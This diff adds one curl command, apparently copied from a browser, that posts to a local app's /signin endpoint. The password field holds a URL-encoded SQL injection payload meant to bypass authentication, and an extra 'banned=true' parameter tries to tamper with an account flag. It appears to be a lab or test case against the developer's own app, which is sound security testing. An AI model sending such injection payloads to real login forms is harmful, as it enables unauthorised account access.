@@ -1,0 +1,21 @@
+curl 'http://localhost:8080/signin' \
+  -v \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+  -H 'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Cookie: Webstorm-e27863a4=4874a7d5-a40c-4716-a3f4-9a0579dd1ade' \
+  -H 'Origin: http://localhost:8080' \
+  -H 'Referer: http://localhost:8080/login.html' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Sec-Fetch-User: ?1' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' \
+  -H 'sec-ch-ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "macOS"' \
+  --data-raw 'name=Katheryn61&pass=1432%27%20or%20%271%27%20%3D%20%271&banned=true' \
+  --compressed
